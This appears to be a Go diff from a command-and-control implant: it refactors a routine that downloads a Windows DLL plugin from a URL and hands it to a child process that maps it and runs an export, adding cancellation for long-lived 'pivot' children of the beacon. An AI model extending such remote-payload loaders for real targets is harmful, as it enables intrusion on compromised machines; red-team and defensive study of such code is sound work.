@@ -61,6 +61,15 @@ var pluginExportPattern = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]{0,127}$`)
 // loadPluginPE fetches the plugin in the parent, then sends the raw DLL bytes
 // to a child over stdin. The child performs all mapping and export execution.
 func loadPluginPE(client *http.Client, cfg *config, url, exportName, input string) (string, error) {
+	ctx, cancel := context.WithTimeout(context.Background(), pluginRunTimeout)
+	defer cancel()
+	return loadPluginPEContext(ctx, client, cfg, url, exportName, input)
+}
+
+// loadPluginPEContext is the persistent form used by channel plugins. The
+// caller owns cancellation so a long-lived pivot child cannot outlive the
+// beacon process during shutdown.
+func loadPluginPEContext(ctx context.Context, client *http.Client, cfg *config, url, exportName, input string) (string, error) {
 	if runtime.GOARCH != "amd64" {
 		return "", errors.New("PE plugins require the windows/amd64 agent build")
 	}
@@ -74,16 +83,17 @@ func loadPluginPE(client *http.Client, cfg *config, url, exportName, input strin
 	_, _ = frame.Write(data)
 	_, _ = frame.WriteString(input)
 
-	ctx, cancel := context.WithTimeout(context.Background(), pluginRunTimeout)
-	defer cancel()
 	cmd := exec.CommandContext(ctx, os.Args[0], "--plugin-child", exportName)
 	cmd.Stdin = &frame
 	var stdout, stderr bytes.Buffer
 	cmd.Stdout = &stdout
 	cmd.Stderr = &stderr
 	if err := cmd.Run(); err != nil {
-		if ctx.Err() != nil {
+		if errors.Is(ctx.Err(), context.DeadlineExceeded) {
 			return "", fmt.Errorf("plugin timed out after %s", pluginRunTimeout)
+		}
+		if ctx.Err() != nil {
+			return "", ctx.Err()
 		}
 		message := strings.TrimSpace(stderr.String())
 		if message == "" {
